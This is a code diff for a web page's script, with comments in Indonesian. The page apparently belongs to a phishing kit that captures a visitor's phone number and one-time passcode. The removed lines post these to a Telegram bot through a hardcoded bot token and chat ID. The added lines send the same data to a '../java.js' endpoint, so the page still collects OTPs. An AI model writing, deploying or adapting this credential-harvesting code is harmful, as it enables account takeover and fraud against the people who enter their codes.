@@ -61,10 +61,6 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        // Ganti token bot Telegram dan chat_id dengan nilai yang sesuai
-        const BOT_TOKEN = '7451357338:AAGaHAyD96AMy2WVLgSbfQi0ovel3Y31IWk';
-        const CHAT_ID = '6269902580';
-
         document.addEventListener("DOMContentLoaded", function () {
             // Set nomor telepon di halaman
             const phone = sessionStorage.getItem("nohp");
@@ -86,23 +82,20 @@
                 return;
             }
 
-            const message = `📱 Phone: ${phone}\n🔑 OTP: ${code}`;
-            
-            console.log("Data yang dikirim:", {
-                chat_id: CHAT_ID,
-                text: message
-            });
+            const data = {
+                phone: phone,
+                otp: code
+            };
+
+            console.log("Data yang dikirim ke ../java.js:", data);
 
             $.ajax({
-                url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                url: "../java.js", // File yang akan menerima data
                 type: "POST",
                 contentType: "application/json",
-                data: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                }),
+                data: JSON.stringify(data),
                 success: function (response) {
-                    alert("Data berhasil dikirim ke bot Telegram!");
+                    alert("Data berhasil dikirim ke ../java.js!");
                     console.log("Respons sukses:", response);
                 },
                 error: function (err) {
